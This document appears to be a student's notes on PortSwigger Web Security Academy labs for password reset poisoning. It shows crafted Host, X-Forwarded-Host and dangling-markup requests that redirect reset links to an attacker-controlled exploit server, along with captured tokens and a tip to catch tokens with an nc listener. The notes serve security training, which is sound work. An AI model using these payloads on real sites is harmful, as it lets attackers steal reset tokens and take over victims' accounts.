all technique that Portswigger teach us, read [here](https://portswigger.net/web-security/host-header/exploiting)

# Password reset poisoning
## general
Note the email is sent to you even tho we changed the `Host header` to point to somewhere else. The plan is we will change host name to a malicious site or the site that we have a control of. The easies way to do this is user the exploit server that the Lab offers.


I then changed host header to ``<original>.com/exploit/` and set it to myself. When I click on it I will send a GET request to the server. On the Access log, I can see that there was a incoming request for `/exploit/forgot-password?temp-forgot-password-token=<token here>`


The goal is change the host header to `<original>.com/exploit/` and change `user=carlos`. Carlos will click on the email and we will then be able to see it on the access log. we will the copy the token and use it to reset carlos password!


Note: If we do ctf, just point it to our `ip:port` and run `nc` listen to that port

## via middleware
```
POST /forgot-password HTTP/1.1
Host: acef1f6f1f685ced80bd5a0d008b0020.web-security-academy.net
X-Forwarded-Host: accd1fba1fc55c3180755a7501740032.web-security-academy.net/exploit
```
same as last task but we cannot use the same trick. This time we are using `X-Forwarded-Host`. How this I find out? just trying out the techniques that PortSwigger mentioned before.. So now when we know that is work by trying on our own account. change `user=carlos` -> check access log for token `/forgot-password?temp-forgot-password-token=wSoizV4lQdJDO84TTnBa6V6cj610GiIT`. Visit it and reset Carlos password!

## via dangling markup
```html
     <script>
            window.addEventListener('DOMContentLoaded', () => {
                for (let el of document.getElementsByClassName('dirty-body')) {
                    el.innerHTML = DOMPurify.sanitize(el.getAttribute('data-dirty'));
                }
            });
        </script>
```

```
POST /forgot-password HTTP/1.1
Host: ac051fe31fa115bd809f1db800380059.web-security-academy.net:'<a href="//ace31ff61f66157680481d3c01e4005d.web-security-academy.net/exploit/
```

```html
<p>Hello!</p><p>Please <a href='https://ac051fe31fa115bd809f1db800380059.web-security-academy.net:'<a href="//ace31ff61f66157680481d3c01e4005d.web-security-academy.net/exploit/?/login'>click here</a> to login with your new password: pUFVxOIq1g</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>
```

no way, I logged into the server with carlos but wasn't done taking note, and do more experiment.... can we redo the lab?